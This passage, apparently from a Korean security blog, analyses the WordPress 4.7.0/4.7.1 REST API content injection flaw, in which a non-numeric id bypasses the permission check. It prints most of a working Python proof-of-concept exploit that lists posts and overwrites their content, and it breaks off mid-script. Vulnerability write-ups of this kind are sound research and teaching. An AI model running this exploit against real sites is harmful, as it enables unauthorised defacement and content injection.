-&lt;span class=&quot;nv&quot;&gt;$modify_test&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$modify_test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_4.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-4]
-  PHP 정수형 형변환 테스트
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;서버IP/index.php/wp-json/wp-v2/posts/4?id=4abc와 같이 요청을 하게 되면 게시물 수정 권한 체크 부분에서는 존재하지 않는 게시물이기에 권한체크로직을 우회하고, 바로 다음 콜랙 함수인 update_item 함수에서는 정수형으로 형변환이 일어나 4의 게시물을 변경하는 작업을 수행하게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;다음은 해당 privilege Escalation / Content Injection 취약점의 POC(Proof of Concept) 코드입니다.&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 2017 - @leonjza&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Wordpress 4.7.0/4.7.1 Unauthenticated Content Injection PoC&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Full bug description: https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Usage example:&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# List available posts:&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# $ python inject.py http://localhost:8070/&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * Discovering API Endpoint&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * API lives at: http://localhost:8070/wp-json/&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * Getting available posts&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#  - Post ID: 1, Title: test, Url: http://localhost:8070/archives/1&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Update post with content from a file:&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# $ cat content&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# foo&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# $ python inject.py http://localhost:8070/ 1 content&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * Discovering API Endpoint&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * API lives at: http://localhost:8070/wp-json/&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * Updating post 1&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * Post updated. Check it out at http://localhost:8070/archives/1&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * Update complete!&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lxml&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;reload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setdefaultencoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_api_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wordpress_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wordpress_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'//link[@rel=&quot;https://api.w.org/&quot;]/@href'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# check if we have permalinks&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'rest_route'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' ! Warning, looks like permalinks are not enabled. This might not work!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_posts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;respone&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'wp/v2/posts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;posts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;respone&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;posts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' - Post ID: {0}, Title: {1}, Url: {2}'&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'title'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'rendered'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'link'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# more than just the content field can be updated. see the api docs here:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# https://developer.wordpress.org/rest-api/reference/posts/#update-a-post&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'content'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;post_content&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'wp/v2/posts/{post_id}/?id={post_id}abc'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/json'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'* Post updated. Check it out at {0}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'link'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Usage: {0} &amp;lt;url&amp;gt; (optional: &amp;lt;post_id&amp;gt; &amp;lt;file with post_content&amp;gt;)'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__file__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# ensure we have at least a url&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# if we have a post id, we need content too&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Please provide a file with post content with a post id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'* Discovering API Endpoint'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_api_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'* API lives at: {0}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# if we only have a url, show the posts we have have&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'* Getting available posts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_posts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# if we get here, we have what we need to update a post!&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'* Updating post {0}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
